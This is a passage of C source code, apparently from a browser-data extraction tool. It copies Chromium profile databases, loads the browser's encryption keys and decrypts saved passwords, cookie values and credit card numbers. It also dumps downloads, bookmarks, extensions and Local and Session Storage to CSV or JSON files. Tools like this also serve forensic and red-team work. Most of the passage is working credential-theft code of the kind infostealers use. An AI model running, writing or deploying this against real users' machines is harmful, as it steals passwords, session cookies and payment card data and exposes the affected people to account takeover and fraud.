        { char _d[256]; snprintf(_d,sizeof(_d),"CHROMIUM: %s FAIL create_tmp_file Downloads %s\n",browser_name,chrome_path); cdiag(_d); }
        print_browser_progress(browser_name, "", "downloads-copy-db-failed", chrome_path);
        return "";
    }

    print_browser_progress(browser_name, "", "downloads-open-sqlite", tmp);
    SQLiteHandler* db = sqlite_open(tmp);
    if (!db) { remove_file(tmp); return ""; }

    #define MAX_DOWNLOADS 20000
    char*** data = (char***)malloc(sizeof(char**) * MAX_DOWNLOADS);
    int data_rows = 0;
    const char* header[] = {"URL", "PATH", "TIME"};

    if (sqlite_read_table(db, "downloads")) {
        int count = sqlite_get_row_count(db);
        { char _d[128]; snprintf(_d,sizeof(_d),"CHROMIUM: %s: %d downloads\n",browser_name,count); cdiag(_d); }
        for (int i = 0; i < count; i++) {
            const char* path = sqlite_get_value(db, i, "current_path");
            const char* url = sqlite_get_value(db, i, "tab_url");
            const char* last_date_str = sqlite_get_value(db, i, "last_access_time");
            int64_t last_date = atoll(last_date_str);
            char date_str[64];
            time_epoch_str(last_date, date_str, sizeof(date_str));

            sb_printf(&sb, "    ---------------------------------------------------------\n");
            sb_printf(&sb, "    [+] URL: %s\n", url);
            sb_printf(&sb, "    [+] PATH: %s\n", path);
            sb_printf(&sb, "    [+] AccessDate: %s\n", date_str);

            if (data_rows < MAX_DOWNLOADS) {
                data[data_rows] = (char**)malloc(sizeof(char*) * 3);
                data[data_rows][0] = _strdup(url);
                data[data_rows][1] = _strdup(path);
                data[data_rows][2] = _strdup(date_str);
                data_rows++;
            }
        }
    }

    if (g_format[0] != '\0') {
        char fn[MAX_PATH];
        snprintf(fn, sizeof(fn), "%s\\%s_download", g_output_dir, browser_name);
        if (strcmp(g_format, "json") == 0) write_json(header, 3, (const char***)data, data_rows, 3, fn);
        else write_csv(header, 3, (const char***)data, data_rows, 3, fn);
    }
    for (int i = 0; i < data_rows; i++) { free(data[i][0]); free(data[i][1]); free(data[i][2]); free(data[i]); }
    free(data);
    sqlite_close(db);
    remove_file(tmp);
    return sb_str(&sb);
}

/* ================================================================
 * Cookie extraction
 * ================================================================ */
const char* chromium_cookies(const char* cookie_path, const char* state_file, const char* browser_name) {
    cdiag("chromium_cookies start");
    static StrBuilder sb;
    sb_init(&sb);

    char tmp[MAX_PATH];
    const char* db_path = cookie_path;
    int using_temp = 0;
    print_browser_progress(browser_name, "", "cookies-copy-db", cookie_path);
    if (create_tmp_file(cookie_path, tmp, sizeof(tmp)) != 0) {
        { char _d[256]; snprintf(_d,sizeof(_d),"CHROMIUM: %s FAIL create_tmp_file Cookies %s\n",browser_name,cookie_path); cdiag(_d); }
        print_browser_progress(browser_name, "", "cookies-copy-db-failed", cookie_path);
        print_browser_progress(browser_name, "", "cookies-open-source-db", cookie_path);
    } else {
        db_path = tmp;
        using_temp = 1;
    }

    ChromiumKeys keys;
    print_browser_progress(browser_name, "", "cookies-load-keys", state_file);
    chromium_keys_load(state_file, &keys);

    print_browser_progress(browser_name, "", "cookies-open-sqlite", db_path);
    SQLiteHandler* db = sqlite_open(db_path);
    if (!db) {
        chromium_keys_free(&keys);
        if (using_temp) remove_file(tmp);
        return "";
    }

    #define MAX_COOKIES 20000
    const char* json_header[] = {"domain","expirationDate","hostOnly","httpOnly","name","path","sameSite","secure","session","storeId","value"};
    const char* csv_header[] = {"HOST","COOKIE","Path","IsSecure","Is_httponly","HasExpire","IsPersistent","CreateDate","ExpireDate","AccessDate"};
    char*** jdata = (char***)malloc(sizeof(char**)*MAX_COOKIES);
    char*** cdata = (char***)malloc(sizeof(char**)*MAX_COOKIES);
    int dcount = 0;

    if (sqlite_read_table(db, "cookies")) {
        print_browser_progress(browser_name, "", "cookies-read-table", "cookies");
        int count = sqlite_get_row_count(db);
        { char _d[128]; snprintf(_d,sizeof(_d),"CHROMIUM: %s: %d cookies in table\n",browser_name,count); cdiag(_d); }
        for (int i = 0; i < count; i++) {
            if (i == 0) print_browser_progress(browser_name, "", "cookies-decrypt-loop-start", "");
            const char* creation_utc = sqlite_get_value(db, i, "creation_utc");
            const char* host_key = sqlite_get_value(db, i, "host_key");
            const char* name = sqlite_get_value(db, i, "name");
            const char* enc_val = sqlite_get_value(db, i, "encrypted_value");
            const char* path = sqlite_get_value(db, i, "path");
            const char* expires_utc = sqlite_get_value(db, i, "expires_utc");
            const char* last_access = sqlite_get_value(db, i, "last_access_utc");
            const char* is_secure = sqlite_get_value(db, i, "is_secure");
            const char* is_httponly = sqlite_get_value(db, i, "is_httponly");
            const char* has_expires = sqlite_get_value(db, i, "has_expires");
            const char* is_persistent = sqlite_get_value(db, i, "is_persistent");
            const char* samesite = sqlite_get_value(db, i, "samesite");

            int64_t cre_date = atoll(creation_utc);
            int64_t exp_date = atoll(expires_utc);
            int64_t last_date = atoll(last_access);

            char cre_str[64], exp_str[64], last_str[64];
            time_epoch_str(cre_date, cre_str, sizeof(cre_str));
            time_epoch_str(exp_date, exp_str, sizeof(exp_str));
            time_epoch_str(last_date, last_str, sizeof(last_str));

            /* Decrypt cookie value via unified multi-key helper */
            char cookie_value[4096] = {0};
            char* dec_val = chromium_decrypt_b64(enc_val, &keys);
            if (dec_val) {
                strncpy(cookie_value, dec_val, sizeof(cookie_value) - 1);
                free(dec_val);
            }
            strip_cookie_hash_prefix(cookie_value, host_key);

            sb_printf(&sb, "    ---------------------------------------------------------\n");
            sb_printf(&sb, "    [+] HOST: %s\n", host_key);
            sb_printf(&sb, "    [+] COOKIE: %s=%s\n", name, cookie_value);
            sb_printf(&sb, "    [+] CreateDate: %s\n", cre_str);
            sb_printf(&sb, "    [+] ExpireDate: %s\n", exp_str);
            sb_printf(&sb, "    [+] AccessDate: %s\n", last_str);
            sb_printf(&sb, "    [+] Path: %s\n", path);

            if (dcount < MAX_COOKIES) {
                char exp_s[32]; snprintf(exp_s, sizeof(exp_s), "%lld", (long long)exp_date);
                char cookie[8192]; snprintf(cookie, sizeof(cookie), "%s=%s", name, cookie_value);

                jdata[dcount] = (char**)malloc(sizeof(char*)*11);
                jdata[dcount][0]=_strdup(host_key); jdata[dcount][1]=_strdup(exp_s);
                jdata[dcount][2]=_strdup("false"); jdata[dcount][3]=_strdup(is_httponly);
                jdata[dcount][4]=_strdup(name); jdata[dcount][5]=_strdup(path);
                jdata[dcount][6]=_strdup(samesite); jdata[dcount][7]=_strdup(is_secure);
                jdata[dcount][8]=_strdup("true"); jdata[dcount][9]=_strdup("0");
                jdata[dcount][10]=_strdup(cookie_value);

                cdata[dcount] = (char**)malloc(sizeof(char*)*10);
                cdata[dcount][0]=_strdup(host_key); cdata[dcount][1]=_strdup(cookie);
                cdata[dcount][2]=_strdup(path); cdata[dcount][3]=_strdup(is_true_false(is_secure)?"true":"false");
                cdata[dcount][4]=_strdup(is_true_false(is_httponly)?"true":"false");
                cdata[dcount][5]=_strdup(is_true_false(has_expires)?"true":"false");
                cdata[dcount][6]=_strdup(is_true_false(is_persistent)?"true":"false");
                cdata[dcount][7]=_strdup(cre_str); cdata[dcount][8]=_strdup(exp_str);
                cdata[dcount][9]=_strdup(last_str);
                dcount++;
            }
        }
    }
    print_browser_progress(browser_name, "", "cookies-done", "");
    {
        char detail[64];
        snprintf(detail, sizeof(detail), "rows=%d", dcount);
        print_browser_progress(browser_name, "", "cookies-rows", detail);
    }

    if (g_format[0] != '\0') {
        char fn[MAX_PATH];
        snprintf(fn, sizeof(fn), "%s\\%s_cookie", g_output_dir, browser_name);
        if (strcmp(g_format, "json") == 0) write_json(json_header, 11, (const char***)jdata, dcount, 11, fn);
        else write_csv(csv_header, 10, (const char***)cdata, dcount, 10, fn);
    }
    for (int i=0;i<dcount;i++){for(int j=0;j<11;j++)free(jdata[i][j]);free(jdata[i]);for(int j=0;j<10;j++)free(cdata[i][j]);free(cdata[i]);}
    free(jdata); free(cdata);
    chromium_keys_free(&keys);
    sqlite_close(db);
    if (using_temp) remove_file(tmp);
    return sb_str(&sb);
}

/* ================================================================
 * Bookmark extraction
 * ================================================================ */
const char* chromium_bookmark(const char* bookmark_path) {
    cdiag("chromium_bookmark start");
    static StrBuilder sb;
    sb_init(&sb);

    char tmp[MAX_PATH];
    if (create_tmp_file(bookmark_path, tmp, sizeof(tmp)) != 0) {
        return "";
    }

    int fl;
    char* content = (char*)read_file(tmp, &fl);
    remove_file(tmp);
    if (!content) return "";

    #define MAX_BOOKMARKS 20000
    char*** data = (char***)malloc(sizeof(char**)*MAX_BOOKMARKS);
    int data_rows = 0;

    /* Scan for "url": entries — each url-type bookmark has:
     *   "name": "TITLE", ..., "type": "url", ..., "url": "VALUE"
     * Only extract name+url pairs that belong to url-type entries. */
    const char* p = content;
    while (*p) {
        const char* url_field = strstr(p, "\"url\":");
        if (!url_field) break;

        /* Find the URL value */
        const char* vs = strchr(url_field + 6, '"');
        if (!vs) { p = url_field + 1; continue; }
        vs++;
        const char* ve = strchr(vs, '"');
        if (!ve) { p = url_field + 1; continue; }
        int url_len = (int)(ve - vs);
        if (url_len >= 1024) url_len = 1023;

        /* Look backward for the nearest "name": in the same object */
        /* Also check if this is a "type": "url" entry (not folder) */
        /* Search backward from url_field for "type": */
        bool is_url_type = false;
        const char* scan = url_field;
        int depth = 0;
        while (scan > content) {
            scan--;
            if (*scan == '}') depth++;
            else if (*scan == '{') {
                if (depth == 0) break; /* object start */
                depth--;
            }
        }
        /* Now scan forward from object start to check for "type":"url" */
        const char* obj_start = scan;
        const char* type_pos = obj_start ? strstr(obj_start, "\"type\":") : NULL;
        if (type_pos && type_pos < url_field) {
            const char* tv = strchr(type_pos + 7, '"');
            if (tv) { tv++; if (strncmp(tv, "url\"", 4) == 0) is_url_type = true; }
        }

        /* Find name: look backward from url_field for nearest "name": */
        char name_buf[1024] = {0};
        if (is_url_type) {
            const char* ns = url_field;
            while (ns > obj_start) {
                ns--;
                if (strncmp(ns, "\"name\":", 7) == 0) {
                    const char* nv = strchr(ns + 7, '"');
                    if (nv && nv < url_field) {
                        nv++;
                        const char* ne = strchr(nv, '"');
                        if (ne && ne < url_field) {
                            int nl = (int)(ne - nv);
                            if (nl < 1024) { memcpy(name_buf, nv, nl); name_buf[nl] = '\0'; }
                        }
                    }
                    break;
                }
            }
        }

        if (is_url_type && url_len > 0) {
            char url_buf[1024];
            memcpy(url_buf, vs, url_len); url_buf[url_len] = '\0';
            const char* title = name_buf[0] ? name_buf : url_buf;

            sb_printf(&sb, "  NAME: %s\n", title);
            sb_printf(&sb, "  URL: %s\n", url_buf);
            if (data_rows < MAX_BOOKMARKS) {
                data[data_rows] = (char**)malloc(sizeof(char*)*2);
                data[data_rows][0] = _strdup(title);
                data[data_rows][1] = _strdup(url_buf);
                data_rows++;
            }
        }

        p = ve + 1;
    }

    if (g_format[0] != '\0') {
        const char* h[] = {"NAME", "URL"};
        char fn[MAX_PATH];
        snprintf(fn, sizeof(fn), "%s\\%s_bookmark", g_output_dir, g_browser_name);
        if (strcmp(g_format, "json") == 0) write_json(h, 2, (const char***)data, data_rows, 2, fn);
        else write_csv(h, 2, (const char***)data, data_rows, 2, fn);
    }
    for (int i=0;i<data_rows;i++){free(data[i][0]);free(data[i][1]);free(data[i]);}
    free(data);
    free(content);
    return sb_str(&sb);
}


/* ================================================================
 * Credit Card extraction
 * ================================================================ */
const char* chromium_creditcards(const char* web_data_path, const char* state_file, const char* browser_name) {
    static StrBuilder sb;
    sb_init(&sb);

    char tmp[MAX_PATH];
    print_browser_progress(browser_name, "", "creditcards-copy-db", web_data_path);
    if (create_tmp_file(web_data_path, tmp, sizeof(tmp)) != 0) return "";

    ChromiumKeys keys;
    print_browser_progress(browser_name, "", "creditcards-load-keys", state_file);
    chromium_keys_load(state_file, &keys);

    print_browser_progress(browser_name, "", "creditcards-open-sqlite", tmp);
    SQLiteHandler* db = sqlite_open(tmp);
    if (!db) {
        chromium_keys_free(&keys);
        remove_file(tmp);
        return "";
    }

    const char* header[] = {"NAME", "CARD_NUMBER", "EXPIRE_MONTH", "EXPIRE_YEAR", "NICKNAME"};
    #define MAX_CARDS 10000
    char*** data = (char***)malloc(sizeof(char**) * MAX_CARDS);
    int dcount = 0;

    if (sqlite_read_table(db, "credit_cards")) {
        int count = sqlite_get_row_count(db);
        for (int i = 0; i < count; i++) {
            const char* name = sqlite_get_value(db, i, "name_on_card");
            const char* month = sqlite_get_value(db, i, "expiration_month");
            const char* year = sqlite_get_value(db, i, "expiration_year");
            const char* enc_number = sqlite_get_value(db, i, "card_number_encrypted");
            const char* nickname = sqlite_get_value(db, i, "nickname");
            char number[4096] = {0};

            if (enc_number && *enc_number) {
                char* val = chromium_decrypt_b64(enc_number, &keys);
                if (val) {
                    strncpy(number, val, sizeof(number) - 1);
                    free(val);
                }
            }

            if (!name && !number[0]) continue;
            sb_printf(&sb, "    ---------------------------------------------------------\n");
            sb_printf(&sb, "    [+] NAME: %s\n", name ? name : "");
            sb_printf(&sb, "    [+] CARD: %s\n", number);
            sb_printf(&sb, "    [+] EXPIRE: %s/%s\n", month ? month : "", year ? year : "");
            sb_printf(&sb, "    [+] NICKNAME: %s\n", nickname ? nickname : "");

            if (dcount < MAX_CARDS) {
                data[dcount] = (char**)malloc(sizeof(char*) * 5);
                data[dcount][0] = _strdup(name ? name : "");
                data[dcount][1] = _strdup(number);
                data[dcount][2] = _strdup(month ? month : "");
                data[dcount][3] = _strdup(year ? year : "");
                data[dcount][4] = _strdup(nickname ? nickname : "");
                dcount++;
            }
        }
    }

    if (g_format[0] != '\0') {
        char fn[MAX_PATH];
        snprintf(fn, sizeof(fn), "%s\\%s_creditcard", g_output_dir, browser_name);
        if (strcmp(g_format, "json") == 0) write_json(header, 5, (const char***)data, dcount, 5, fn);
        else write_csv(header, 5, (const char***)data, dcount, 5, fn);
    }

    for (int i = 0; i < dcount; i++) {
        for (int j = 0; j < 5; j++) free(data[i][j]);
        free(data[i]);
    }
    free(data);
    chromium_keys_free(&keys);
    sqlite_close(db);
    remove_file(tmp);
    return sb_str(&sb);
}

/* ================================================================
 * Extension extraction
 * ================================================================ */
const char* chromium_extensions(const char* secure_preferences_path, const char* browser_name) {
    static StrBuilder sb;
    sb_init(&sb);

    int fl = 0;
    char* json = (char*)read_file(secure_preferences_path, &fl);
    if (!json) return "";

    const char* ext_root = json_find_object_by_key_simple(json, "extensions");
    const char* settings_obj = NULL;
    if (ext_root) {
        settings_obj = json_find_object_by_key_simple(ext_root, "settings");
        if (!settings_obj) settings_obj = json_find_object_by_key_simple(ext_root, "opsettings");
    }
    if (!settings_obj) {
        const char* settings_root = json_find_object_by_key_simple(json, "settings");
        if (settings_root) {
            settings_obj = json_find_object_by_key_simple(settings_root, "extensions");
            if (!settings_obj) settings_obj = json_find_object_by_key_simple(settings_root, "settings");
        }
    }
    if (!settings_obj) {
        free(json);
        return "";
    }

    const char* settings_end = json_object_end_simple(settings_obj);
    const char* p = settings_obj;
    const char* header[] = {"ID", "NAME", "VERSION", "ENABLED", "DESCRIPTION"};
    #define MAX_EXTENSIONS 10000
    char*** data = (char***)malloc(sizeof(char**) * MAX_EXTENSIONS);
    int rows = 0;

    while ((p = strchr(p, '"')) != NULL && p < settings_end) {
        const char* key_end = strchr(p + 1, '"');
        if (!key_end || key_end >= settings_end) break;
        if (key_end - p - 1 < 8 || key_end - p - 1 > 64) { p = key_end + 1; continue; }
        const char* q = key_end + 1;
        while (q < settings_end && isspace((unsigned char)*q)) q++;
        if (q >= settings_end || *q != ':') { p = key_end + 1; continue; }
        q++;
        while (q < settings_end && isspace((unsigned char)*q)) q++;
        if (q >= settings_end || *q != '{') { p = key_end + 1; continue; }
        const char* obj_end = json_object_end_simple(q);
        if (!obj_end) break;

        char ext_id[128], name[512] = "", version[128] = "", desc[1024] = "", state[64] = "", location[64] = "", enabled[32] = "false";
        int id_len = (int)(key_end - p - 1);
        memcpy(ext_id, p + 1, id_len);
        ext_id[id_len] = 0;

        json_get_value_simple(q, obj_end, "location", location, sizeof(location));
        if (strcmp(location, "5") == 0 || strcmp(location, "10") == 0) {
            p = obj_end;
            continue;
        }

        const char* manifest = json_find_object_by_key_simple(q, "manifest");
        const char* manifest_end = manifest ? json_object_end_simple(manifest) : NULL;
        if (manifest) {
            json_get_value_simple(manifest, manifest_end, "name", name, sizeof(name));
            json_get_value_simple(manifest, manifest_end, "version", version, sizeof(version));
            json_get_value_simple(manifest, manifest_end, "description", desc, sizeof(desc));
        }
        if (!name[0]) { p = obj_end; continue; }

        json_get_value_simple(q, obj_end, "state", state, sizeof(state));
        if (strcmp(state, "1") == 0) strcpy(enabled, "true");
        else if (json_find_in_range(q, obj_end, "\"disable_reasons\": []")) strcpy(enabled, "true");

        sb_printf(&sb, "    ---------------------------------------------------------\n");
        sb_printf(&sb, "    [+] ID: %s\n", ext_id);
        sb_printf(&sb, "    [+] NAME: %s\n", name);
        sb_printf(&sb, "    [+] VERSION: %s\n", version);
        sb_printf(&sb, "    [+] ENABLED: %s\n", enabled);
        sb_printf(&sb, "    [+] DESCRIPTION: %s\n", desc);

        if (rows < MAX_EXTENSIONS) {
            data[rows] = (char**)malloc(sizeof(char*) * 5);
            data[rows][0] = _strdup(ext_id);
            data[rows][1] = _strdup(name);
            data[rows][2] = _strdup(version);
            data[rows][3] = _strdup(enabled);
            data[rows][4] = _strdup(desc);
            rows++;
        }
        p = obj_end;
    }

    if (g_format[0] != '\0') {
        char fn[MAX_PATH];
        snprintf(fn, sizeof(fn), "%s\\%s_extension", g_output_dir, browser_name);
        if (strcmp(g_format, "json") == 0) write_json(header, 5, (const char***)data, rows, 5, fn);
        else write_csv(header, 5, (const char***)data, rows, 5, fn);
    }
    for (int i = 0; i < rows; i++) {
        for (int j = 0; j < 5; j++) free(data[i][j]);
        free(data[i]);
    }
    free(data);
    free(json);
    return sb_str(&sb);
}

/* ================================================================
 * LocalStorage extraction (best-effort LevelDB fragment recovery)
 * ================================================================ */
const char* chromium_local_storage(const char* local_storage_dir, const char* browser_name) {
    static StrBuilder sb;
    sb_init(&sb);
    BinaryString* fragments = (BinaryString*)calloc(4096, sizeof(BinaryString));
    if (!fragments) {
        print_browser_progress(browser_name, "", "local-storage-alloc-failed", "");
        return "";
    }
    StorageScanStats stats = {0};
    print_browser_progress(browser_name, "", "local-storage-scan-start", local_storage_dir);
    int count = collect_storage_fragments(local_storage_dir, fragments, 4096, &stats);
    {
        char detail[256];
        snprintf(detail, sizeof(detail), "files=%d fragments=%d skip-large=%d skip-read=%d",
                 stats.scanned_files, stats.fragments_found, stats.skipped_large_files, stats.skipped_read_failures);
        print_browser_progress(browser_name, "", "local-storage-scan-done", detail);
    }
    if (count <= 0) {
        free(fragments);
        print_browser_progress(browser_name, "", "local-storage-no-data", "");
        return "";
    }

    const char* header[] = {"SCOPE", "KEY", "VALUE", "NOTE"};
    #define MAX_STORAGE_ROWS 10000
    char*** data = (char***)malloc(sizeof(char**) * MAX_STORAGE_ROWS);
    int rows = 0;

    for (int i = 0; i < count; i++) {
        const char* s = fragments[i].value;
        if (strncmp(s, "META:", 5) == 0 || strncmp(s, "METAACCESS:", 11) == 0) {
            append_unique_storage_row(data, &rows, MAX_STORAGE_ROWS, "meta", s, "", "LocalStorage metadata");
            continue;
        }
        if (strncmp(s, "http://", 7) == 0 || strncmp(s, "https://", 8) == 0 || strncmp(s, "chrome://", 9) == 0) {
            const char* key = (i + 1 < count) ? fragments[i + 1].value : "";
            const char* value = (i + 2 < count) ? fragments[i + 2].value : "";
            append_unique_storage_row(data, &rows, MAX_STORAGE_ROWS, s, key, value, "Recovered LocalStorage fragment");
        }
    }

    for (int i = 0; i < rows; i++) {
        sb_printf(&sb, "    ---------------------------------------------------------\n");
        sb_printf(&sb, "    [+] SCOPE: %s\n", data[i][0]);
        sb_printf(&sb, "    [+] KEY: %s\n", data[i][1]);
        sb_printf(&sb, "    [+] VALUE: %s\n", data[i][2]);
        sb_printf(&sb, "    [+] NOTE: %s\n", data[i][3]);
    }

    if (g_format[0] != '\0') {
        char fn[MAX_PATH];
        snprintf(fn, sizeof(fn), "%s\\%s_localstorage", g_output_dir, browser_name);
        if (strcmp(g_format, "json") == 0) write_json(header, 4, (const char***)data, rows, 4, fn);
        else write_csv(header, 4, (const char***)data, rows, 4, fn);
    }
    {
        char detail[64];
        snprintf(detail, sizeof(detail), "rows=%d", rows);
        print_browser_progress(browser_name, "", "local-storage-rows", detail);
    }

    for (int i = 0; i < rows; i++) {
        for (int j = 0; j < 4; j++) free(data[i][j]);
        free(data[i]);
    }
    free(data);
    free(fragments);
    return sb_str(&sb);
}

/* ================================================================
 * SessionStorage extraction (best-effort LevelDB fragment recovery)
 * ================================================================ */
const char* chromium_session_storage(const char* session_storage_dir, const char* browser_name) {
    static StrBuilder sb;
    sb_init(&sb);
    BinaryString* fragments = (BinaryString*)calloc(4096, sizeof(BinaryString));
    if (!fragments) {
        print_browser_progress(browser_name, "", "session-storage-alloc-failed", "");
        return "";
    }
    StorageScanStats stats = {0};
    print_browser_progress(browser_name, "", "session-storage-scan-start", session_storage_dir);
    int count = collect_storage_fragments(session_storage_dir, fragments, 4096, &stats);
    {
        char detail[256];
        snprintf(detail, sizeof(detail), "files=%d fragments=%d skip-large=%d skip-read=%d",
                 stats.scanned_files, stats.fragments_found, stats.skipped_large_files, stats.skipped_read_failures);
        print_browser_progress(browser_name, "", "session-storage-scan-done", detail);
    }
    if (count <= 0) {
        free(fragments);
        print_browser_progress(browser_name, "", "session-storage-no-data", "");
        return "";
    }

    const char* header[] = {"SCOPE", "KEY", "VALUE", "NOTE"};
    char*** data = (char***)malloc(sizeof(char**) * MAX_STORAGE_ROWS);
    int rows = 0;

    for (int i = 0; i < count; i++) {
        const char* s = fragments[i].value;
        if (strncmp(s, "namespace-", 10) == 0 || strncmp(s, "map-", 4) == 0) {
            const char* value = (i + 1 < count) ? fragments[i + 1].value : "";
            append_unique_storage_row(data, &rows, MAX_STORAGE_ROWS, s, value, "", "Recovered SessionStorage fragment");
            continue;
        }
        if ((strncmp(s, "http://", 7) == 0 || strncmp(s, "https://", 8) == 0 || strncmp(s, "chrome://", 9) == 0) && i + 1 < count) {
            append_unique_storage_row(data, &rows, MAX_STORAGE_ROWS, s, fragments[i + 1].value, (i + 2 < count) ? fragments[i + 2].value : "", "Recovered SessionStorage fragment");
        }
    }

    for (int i = 0; i < rows; i++) {
        sb_printf(&sb, "    ---------------------------------------------------------\n");
        sb_printf(&sb, "    [+] SCOPE: %s\n", data[i][0]);
        sb_printf(&sb, "    [+] KEY: %s\n", data[i][1]);
        sb_printf(&sb, "    [+] VALUE: %s\n", data[i][2]);
        sb_printf(&sb, "    [+] NOTE: %s\n", data[i][3]);
    }

    if (g_format[0] != '\0') {
        char fn[MAX_PATH];
        snprintf(fn, sizeof(fn), "%s\\%s_sessionstorage", g_output_dir, browser_name);
        if (strcmp(g_format, "json") == 0) write_json(header, 4, (const char***)data, rows, 4, fn);
        else write_csv(header, 4, (const char***)data, rows, 4, fn);
    }
    {
        char detail[64];
        snprintf(detail, sizeof(detail), "rows=%d", rows);
        print_browser_progress(browser_name, "", "session-storage-rows", detail);
    }

    for (int i = 0; i < rows; i++) {
        for (int j = 0; j < 4; j++) free(data[i][j]);
        free(data[i]);
    }
    free(data);
    free(fragments);
    return sb_str(&sb);
}

/* ================================================================
 * Login extraction
 * ================================================================ */
const char* chromium_logins(const char* login_path, const char* state_file, const char* browser_name) {
    cdiag("chromium_logins start");
    static StrBuilder sb;
    sb_init(&sb);

    char tmp[MAX_PATH];
    print_browser_progress(browser_name, "", "logins-copy-db", login_path);
    if (create_tmp_file(login_path, tmp, sizeof(tmp)) != 0) {
        { char _d[256]; snprintf(_d,sizeof(_d),"CHROMIUM: %s FAIL create_tmp_file %s\n",browser_name,login_path); cdiag(_d); }
        print_browser_progress(browser_name, "", "logins-copy-db-failed", login_path);
        return "";
    }
    cdiag("  tmp_file OK, getting system key...");

    ChromiumKeys keys;
    cdiag("  loading chromium keys...");
    print_browser_progress(browser_name, "", "logins-load-keys", state_file);
    chromium_keys_load(state_file, &keys);

    cdiag("  opening SQLite...");
    print_browser_progress(browser_name, "", "logins-open-sqlite", tmp);
    SQLiteHandler* db = sqlite_open(tmp);
    if (!db) { cdiag("  FAIL sqlite_open"); chromium_keys_free(&keys); remove_file(tmp); return ""; }
    cdiag("  SQLite open OK");

    #define MAX_LOGINS 20000
    char*** data = (char***)malloc(sizeof(char**)*MAX_LOGINS);
    int dcount = 0;
    const char* header[] = {"URL", "USERNAME", "PASSWORD", "CreateDate"};

    if (sqlite_read_table(db, "logins")) {
        int count = sqlite_get_row_count(db);
        { char _d[128]; snprintf(_d,sizeof(_d),"CHROMIUM: %s: %d logins in table\n",browser_name,count); cdiag(_d); }
        for (int i = 0; i < count; i++) {
            const char* url = sqlite_get_value(db, i, "origin_url");
            const char* username = sqlite_get_value(db, i, "username_value");
            const char* enc_pw = sqlite_get_value(db, i, "password_value");
            const char* date_created = sqlite_get_value(db, i, "date_created");
            int64_t cre_date = atoll(date_created);
            char date_str[64];
            time_epoch_str(cre_date, date_str, sizeof(date_str));

            /* Decrypt password via unified multi-key helper */
            char password[4096] = {0};
            char* val = chromium_decrypt_b64(enc_pw, &keys);
            if (val) {
                strncpy(password, val, sizeof(password) - 1);
                free(val);
            }

            sb_printf(&sb, "    ---------------------------------------------------------\n");
            sb_printf(&sb, "    [+] URL: %s\n", url);
            sb_printf(&sb, "    [+] USERNAME: %s\n", username);
            sb_printf(&sb, "    [+] PASSWORD: %s\n", password);
            sb_printf(&sb, "    [+] CreateDate: %s\n", date_str);

            if (dcount < MAX_LOGINS) {
                data[dcount] = (char**)malloc(sizeof(char*)*4);
                data[dcount][0]=_strdup(url); data[dcount][1]=_strdup(username);
                data[dcount][2]=_strdup(password); data[dcount][3]=_strdup(date_str);
                dcount++;
            }
        }
    }

    {
        char dbg[256];
        snprintf(dbg, sizeof(dbg), "CHROMIUM: %s logins CSV check: g_format='%s' dcount=%d\n",
                 browser_name, g_format, dcount);
        cdiag(dbg);
    }
    if (g_format[0] != '\0') {
        char fn[MAX_PATH];
        snprintf(fn, sizeof(fn), "%s\\%s_login", g_output_dir, browser_name);
        { char dbg[512]; snprintf(dbg, sizeof(dbg), "CHROMIUM: writing CSV: %s (%d rows)\n", fn, dcount); cdiag(dbg); }
        if (strcmp(g_format, "json") == 0) write_json(header, 4, (const char***)data, dcount, 4, fn);
        else write_csv(header, 4, (const char***)data, dcount, 4, fn);
        { char dbg[512]; snprintf(dbg, sizeof(dbg), "CHROMIUM: CSV done: %s\n", fn); cdiag(dbg); }
    }
    for (int i=0;i<dcount;i++){for(int j=0;j<4;j++)free(data[i][j]);free(data[i]);}
    free(data);
    chromium_keys_free(&keys);
    sqlite_close(db);
    remove_file(tmp);
    return sb_str(&sb);
}
